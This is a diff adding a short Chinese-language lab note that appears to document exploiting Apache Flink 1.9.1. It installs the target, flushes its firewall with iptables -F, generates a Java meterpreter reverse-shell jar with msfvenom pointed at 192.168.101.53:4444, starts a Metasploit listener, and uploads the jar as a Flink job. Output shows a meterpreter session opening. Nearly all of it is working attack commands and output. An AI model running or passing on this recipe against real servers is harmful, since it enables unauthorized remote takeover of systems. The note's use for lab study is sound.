@@ -1,0 +1,30 @@
+flink-1.9.1有漏洞
+靶子上安装java
+yum install java -y
+解压 tar zxvf flink-1.9.1-bin-scala_2.11.tgz
+进文件夹 cd flink-1.9.1/bin/
+./start-cluster.sh
+iptables -F
+
+生成反弹的jar包
+msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.101.53 LPORT=4444 -f jar > bao.jar 
+
+然后我们先开一个监听
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload java/meterpreter/reverse_tcp
+payload => java/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.101.53
+LHOST => 192.168.101.53
+
+直接将下载的任务上传到任务上面 执行一下任务就可以拿到shell了
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 192.168.101.53:4444 
+[*] Sending stage (57971 bytes) to 192.168.101.99
+[*] Meterpreter session 1 opened (192.168.101.53:4444 -> 192.168.101.99:38516) at 2025-02-18 16:07:17 +0800
+
+meterpreter > 
+
+直接拿到控制权
+
